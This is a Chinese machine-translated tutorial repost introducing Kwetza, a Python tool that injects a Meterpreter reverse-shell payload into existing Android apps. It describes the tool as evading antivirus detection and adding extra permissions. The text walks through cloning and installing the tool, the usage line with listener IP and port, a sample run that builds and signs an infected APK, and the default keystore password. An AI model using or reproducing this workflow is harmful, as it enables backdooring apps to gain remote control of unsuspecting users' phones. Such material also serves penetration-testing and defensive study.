# kwet za——用 Meterpreter 有效负载感染现有 Android 应用程序的工具

> 原文：<https://kalilinuxtutorials.com/kwetza-android-application/>

Kwetza 是一个工具，允许您用 Meterpreter 有效负载感染现有的 Android 应用程序。Python 脚本为现有的 Android 应用程序注入了一个 Meterpreter 负载。

## **奎扎究竟做了什么？**

Kwetza 通过定制或默认的有效载荷模板感染现有的 Android 应用程序，以避免被反病毒软件检测到。Kwetza 允许您使用目标应用程序的默认权限感染 Android 应用程序，或者注入附加权限以获得附加功能。

**也读作[PEM cracker——破解加密 PEM 文件的工具](https://kalilinuxtutorials.com/pemcracker-encrypted-pem/)**

## **获取代码**

首先获取代码:

```
git clone https://github.com/sensepost/kwetza.git
```

它是用 Python 编写的，需要 BeautifulSoup，可以使用 Pip 安装:

```
pip install beautifulsoup4
```

它需要安装 Apktool，并且可以通过您的路径访问。这可以使用位于[这里](https://ibotpeaches.github.io/Apktool/install)的安装说明进行设置。

## **用法**

python kwetza . py name of apktoinfect . apk https/TCP LHOST LPORT 是/否自定义类

*   **nameoftheapktoinfect . apk**=您希望感染的 apk 的名称。
*   **https/tcp** =选择 https 或 tcp 连接
*   **LHOST** =你的监听器的 IP。
*   **LPORT** =您的监听器的端口。
*   **yes** =包含“yes”以将额外的邪恶 perms 注入应用程序，“no”以利用应用程序的默认权限。
*   **customClass** =如果您希望将自定义活动注入到此活动中，请在此处指定该活动。

```
python kwetza.py hackme.apk https 10.42.0.118 4444 yes com.moo.another.activity
[+] MMMMMM KWETZA
[*] DECOMPILING TARGET APK
[+] ENDPOINT IP: 10.42.0.118
[+] ENDPOINT PORT: 4444
[+] APKTOOL DECOMPILED SUCCESS
[*] BYTING COMMS...
[*] ANALYZING ANDROID MANIFEST...
[+] TARGET ACTIVITY: com.foo.moo.gui.MainActivity
[*] INJECTION INTO APK
[+] CHECKING IF ADDITIONAL PERMS TO BE ADDED
[*] INJECTION OF CRAZY PERMS TO BE DONE!
[+] TIME TO BUILD INFECTED APK
[*] EXECUTING APKTOOL BUILD COMMAND
[+] BUILD RESULT
############################################
I: Using APktool 2.2.0
I: Checking whether source shas changed...
I: Smaling smali folder into classes.dex
I: Checking whether resources has changed...
I: Building resources...
I: Copying libs ...(/lib)
I: Building apk file...
I: Copying unknown files/dir...
###########################################
[*] EXECUTING JARSIGNER COMMAND...
Enter Passphrase for keystore: password
[+] JARSIGNER RESULT
###########################################
jar signed.

###########################################

[+] L00t located at hackme/dist/hackme.apk
```

## 信息 

该工具是为配合 Python 2 而开发的。

默认情况下，它将使用位于“payload”文件夹中的模板和密钥库来注入和签名受感染的 apk。

如果您想用自己的证书对受感染的应用程序进行签名，请生成一个新的密钥库，并将其放在“payload”文件夹中，然后重命名为现有的密钥库，或者更改 kwetza.py 中的引用。

对于有效负载模板也可以这样做。

默认密钥库的密码是“password”。

[![](img/d861a9096555aeb1980fc054015933d7.png)](https://github.com/sensepost/kwetza)